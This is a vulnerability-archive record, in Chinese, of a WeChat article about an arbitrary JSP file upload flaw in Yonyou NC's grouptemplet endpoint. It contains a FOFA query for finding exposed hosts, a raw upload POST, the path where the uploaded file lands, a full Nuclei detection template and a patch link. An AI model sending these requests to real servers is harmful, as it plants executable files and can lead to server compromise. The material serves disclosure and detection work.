---
source: "gelusus/wxvl 公众号漏洞文库"
title: "用友NC grouptemplet 文件上传"
product: "用友NC"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本不详；固定head.jsp落点待证"
prerequisites: "无Cookie样例"
side_effects: "请求可能删除/覆盖数据、修改账号或持久改变业务状态；文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行"
review_date: "2026-10-02"
source_status: "unknown"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/ERP%E4%BC%81%E4%B8%9A/%E7%94%A8%E5%8F%8BNC/%E7%94%A8%E5%8F%8BNC%20grouptemplet%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
id: "vw-358425867bc143b9521a02db"
entity_id: "ve-358425867bc143b9521a02db"
schema_version: "1"
---

# 用友NC grouptemplet 文件上传

## 条目说明

- 对象与具体问题：用友NC；grouptemplet 文件上传
- 版本、配置及部署条件：版本不详；固定head.jsp落点待证
- 认证与权限前提：无Cookie样例
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 请求随机filename最终固定/uapim/static/pages/nc/head.jsp，应解释重命名/覆盖逻辑，可能覆盖现有文件
- Nuclei读取固定head.jsp与随机回显相互一致，但verified:true无独立证据
- 广告免责声明拆字噪声；patchList不是具体修复版本

## 操作风险

请求可能删除/覆盖数据、修改账号或持久改变业务状态；文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

原创 fgz  AI与网安   2024-04-29 07:00  
  
免  
责  
申  
明  
：**本文内容为学习笔记分享，仅供技术学习参考，请勿用作违法用途，任何个人和组织利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责，与作者无关！！！**  
  
****  
**次条通常是广告，内容我也没验证，感兴趣的自行验证，不感兴趣的忽略。**  
  
  
  
01  
  
—  
  
漏洞名称  
  
  
  
用友NC grouptemplet 任意文件上传漏洞  
  
  
  
02  
  
—  
  
漏洞影响  
  
  
用友NC 版本不详  
  
  
  
  
03  
  
—  
  
漏洞描述  
  
  
用友NC是大型企业管理与电子商务平台，帮助企业实现管理转型升级全面从以产品为中心转向以客户为中心（C2B）；从流程驱动转向数据驱动（DDE）；从延时运行转为实时运行（RTE）；从领导指挥到员工创新（E2M）。用友NC grouptemplet接口处存在任意文件上传漏洞，攻击者通过漏洞可以获取网站权限，导致服务器失陷。  
  
  
04  
  
—  
  
FOFA搜索语句  
  
  
```
icon_hash="1085941792"
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BOqZXohpWdOwticawLfzcmBeOIWJzicQSA1Ul4XjJ13ur72JJlSHMTKNW6Z0rIGDYQiaicDV5LDIvaB2Q/640?wx_fmt=png&from=appmsg "")  
  
  
05  
  
—  
  
漏洞复现  
  
  
POC  
```http
POST /uapim/upload/grouptemplet?groupid=nc&fileType=jsp HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36
Connection: close
Content-type: multipart/form-data; boundary=----------ny4hGVLLpZPZm0CE3KNtyhNSXvFgk
Accept-Encoding: gzip

------------ny4hGVLLpZPZm0CE3KNtyhNSXvFgk
Content-Disposition: form-data; name="upload"; filename="2fiu0YTGkaX2DrJlUZZP5IGvNvk.jsp"
Content-Type: application/octet-stream

<%out.println("2fiu0WM4788fa6NcMHipkIthTTW");%>
------------ny4hGVLLpZPZm0CE3KNtyhNSXvFgk--
```  

> 请求长度说明：原资料 Content-Length 为 268；静态长度已移除，应由客户端根据最终请求体的字节数生成。
  
回显路径  
```
/uapim/static/pages/nc/head.jsp
```  
  
  
  
  
  
06  
  
—  
  
nuclei poc  
  
  
poc文件内容如下  
```
id: yonyou-nc-grouptemplet-fileupload

info:
  name: 用友NC grouptemplet 任意文件上传漏洞
  author: fgz
  severity: critical
  description: |
    用友NC是大型企业管理与电子商务平台，帮助企业实现管理转型升级全面从以产品为中心转向以客户为中心（C2B）；从流程驱动转向数据驱动（DDE）；从延时运行转为实时运行（RTE）；从领导指挥到员工创新（E2M）。用友NC grouptemplet接口处存在任意文件上传漏洞，攻击者通过漏洞可以获取网站权限，导致服务器失陷。
  reference:
    none
  metadata:
    verified: true
    max-request: 2
    fofa-query: icon_hash="1085941792"
  tags: yonyou,nc,fileupload,2024

variables:
  boundary: '{{rand_base(29)}}'

http:
  - raw:
      - |
        POST /uapim/upload/grouptemplet?groupid=nc&fileType=jsp HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36
        Content-type: multipart/form-data; boundary=----------{{boundary}}
        
        ------------{{boundary}}
        Content-Disposition: form-data; name="upload"; filename="{{randstr_1}}.jsp"
        Content-Type: application/octet-stream
        
        <%out.println("{{randstr_2}}");%>
        ------------{{boundary}}--

      - |
        GET /uapim/static/pages/nc/head.jsp HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Accept-Encoding: gzip

    req-condition: true
    matchers:
      - type: dsl
        dsl:
          - "status_code_1 == 200"
          - "status_code_2 == 200 && contains(body_2,'{{randstr_2}}')"
        condition: and
```  
  
  
  
  
07  
  
—  
  
修复建议  
  
  
升级到最新版本。  
  
用友安全中心补丁连接  
```
https://security.yonyou.com/#/patchList
```  
  
  


---

> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原文见文首链接）
